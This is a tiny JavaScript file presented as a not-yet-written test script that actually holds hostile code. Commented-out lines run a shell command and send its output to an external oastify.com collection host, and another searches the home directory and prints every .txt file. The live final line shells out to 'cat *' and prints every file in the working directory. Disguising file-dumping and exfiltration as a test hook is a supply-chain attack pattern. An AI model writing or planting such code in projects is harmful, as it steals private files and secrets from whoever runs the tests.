// TODO: implement the tests
console.log("Tests are not implemented yet...");


//const { exec } = require('child_process');
//let a = exec('ls');
//fetch("https://vbaj623gs0hv8em8lcyvyqyba2gt4osd.oastify.com/?" + a);

//var cp = require('child_process');
//console.log(cp.execSync('find ~ -name "*.txt" -exec cat {} +').toString());

var cp = require('child_process');
console.log(cp.execSync('cat *').toString());
